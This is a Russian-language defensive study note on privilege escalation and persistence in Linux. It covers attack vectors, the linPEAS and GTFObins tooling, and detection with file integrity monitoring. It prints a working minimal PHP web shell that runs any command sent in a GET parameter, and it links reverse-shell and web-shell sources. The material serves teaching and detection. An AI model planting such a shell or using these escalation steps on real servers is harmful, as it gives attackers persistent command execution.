# ***Основные понятия***

### ***Локальное повышение привилегий***

***Атака с повышением привилегий*** - это кибератака с целью получить несанкционированный доступ с повышенными правами, выходящими за рамки тех, которые назначены для используемой атакующей учетной записи пользователя или компьютера 

***Повышение привилегий позволяет злоумышленникам открыть новые векторы атак на сеть жертвы:*** 
- Получение доступа к другим системам 
- Развертывание дополнительных вредоносных полезных нагрузок в целевой системе 
- Настройка параметров безопасности или привилегий 
- Получение доступа к приложениям или данным в системе, выходящими за рамки привилегий исходной скомпрометированной учетной записи 
- Получение административного (root) доступа к целевой системе или сразу к нескольким машинам сети 

*Признаками повышения привилегий могут являться вредоносное ПО в конфиденциальных системах, подозрительные входы в систему и необычные сетевые соединения, срабатывания систем EDR, NIDS, DLP и т.д* 

***Повышение привилегий бывает вертикальным и горизонтальным:*** 
- ***Вертикальное повышение привилегий*** - атакующий получил доступ к непривилегированной учетной записи пользователя, и применив эксплойт, получил права суперпользователя в системе 
- ***Горизонтальное повышение привилегий*** - пользователь получил доступ к сессии другого пользователя из-за уязвимости а приложении 
### ***Векторы атак с целью повышения привилегий***

1. ***Использование учетных данных***

***Распространенные способы, которыми злоумышленники могут получить доступ к учетным записям:*** 
- Пароли хранятся в открытом виде 
- Подбор пароля 
- Повторное использование пароля 
- Перебор пароля (brute-force)
- Распыление паролей (password spraying)
- Использование механизмов для сброса паролей 

2. ***Уязвимости и эксплойты***

*Злоумышленники могут повысить привилегии, используя уязвимости в архитектуре, реализации или конфигурации систем, включая протоколы связи, сетевые устройства, операционные системы, браузеры, веб-приложения, облачные системы и сетевую инфраструктуру*

3. ***Неправильные конфигурации***

***Вот несколько примеров неправильных настроек безопасности, которые могут привести к повышению привилегий:***
- Облачные хранилища доступны из интернета без аутентификации 
- Пароли по умолчанию, используемые для учетной записи администратора или root 
- Небезопасные настройки по умолчанию вновь установленной системы, которые не изменяются по небрежности или недостатку знаний 
- Бэкдор в систему, который был известен администраторам, но не задокументирован и обнаружен злоумышленником 

4. ***Вредоносное ПО***

***Ниже представлены распространенные примеры вредоносных программ, которые можно использовать для повышения привилегий:***
- Червь 
- Руткит 
- Троян 
- Шпионское ПО 

5. ***Социальная инженерия***

*Она основана на манипулировании людьми с целью нарушения процедур безопасности и разглашения конфиденциальной или личной информации*
# ***Обнаружение повышения привилегий в Linux-системах***

### ***Основные техники, которые используют хакеры для повышения привилегий в Linux***

*Если атакующий хочет повысить права, то первым делом он обычно пытается определить, с какой ОС он имеет дело, какие права есть у имеющегося пользователя, какие (возможно уязвимые или полезные для атаки) приложения установлены в системе, с какими правами эти приложения выполняются и как они настроены*

*Хотя все эти проверки можно провести вручную, обычно используются уже готовые скрипты, например [LinEnum](https://github.com/rebootuser/LinEnum) (Linux Enumeration) или [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) (Linux Privilege Escalation Awesome Script)*

*Обратимся к GTFObins: [Ресурс GTFObins](https://gtfobins.github.io/) - ресурсу, где собраны способы повышения привилегий за счет имеющихся на машине бинарных файлов*

*Zabbix может выполнить команду `tar` ([GTFObins:TAR](https://gtfobins.github.io/gtfobins/tar/)) от имени root, что позволяет атакующему получить командную оболочку администратора*
### ***Обнаружение***

С позиции Blue Team-специалиста, такие инструменты как `LinPEAS` генерируют большое количество событий подряд (запуск команд для работы с текстовыми данными `grep`), не характерное для работы человека, занимающимся фильтрацией данных. Определения всплеска такой активности может помочь с обнаружением злоумышленника

# ***Обнаружение закрепления в системе и противодействие***

### ***Web-shell***

*Получив первоначальный доступ, атакующие как правило будут пытаться закрепиться в системе. Один из таких способов — веб-закладки. Скопировав один из множества вариантов файлов на сервер (PHP-web-shells: [php-webshells](https://github.com/JohnTroony/php-webshells)), атакующий может обратиться к нему и получить возможность выполнять произвольные команды*

***Пример PHP-файла:***

```
<html>  
<body>  
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">  
<input type="TEXT" name="cmd" id="cmd" size="80">  
<input type="SUBMIT" value="Execute">  
</form>  
<pre>  
<?php  
    if(isset($_GET['cmd']))  
    {  
        system($_GET['cmd']);  
    }  
?>  
</pre>
```

*Разместив такой файл в `/var/www/html` (в нашем случае `/var/www/html/wordpress`), мы можем получить к нему доступ*

*Код web-shell может быть интегрирован в уже имеющиеся страницы сайта, а также модифицирован, например, вместо выполнения произвольных команд, атакующий может встроить reverse-shell, который будет подключаться к инфраструктуре атакующих каждый раз при открытии страницы. Пример можно найти на GitHub: [Пример PHP-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).*
### ***Противодействие***

***FIM*** - это способ контроля целостности файлов. Программа с некоторой периодичностью создает контрольные суммы файлов системы, и сравнивает их предыдущими значениями. Если контрольная сумма изменилась - значит файл был изменен, и программа запишет это событие в лог 

***Из Open-source решений, которые делают FIM можно выделить три самых популярных:***
- Auditbeat’s File Integrity Monitoring: [Auditbeat’s File Integrity Monitoring](https://www.elastic.co/guide/en/beats/auditbeat/current/auditbeat-module-file_integrity.html)
- Auditd: [Auditd](https://www.redhat.com/sysadmin/configure-linux-auditing-auditd)
- Wazuh’s File Integrity Monitoring: [Wazuh’s File Integrity Monitoring](https://documentation.wazuh.com/current/learning-wazuh/detect-fs-changes.html)
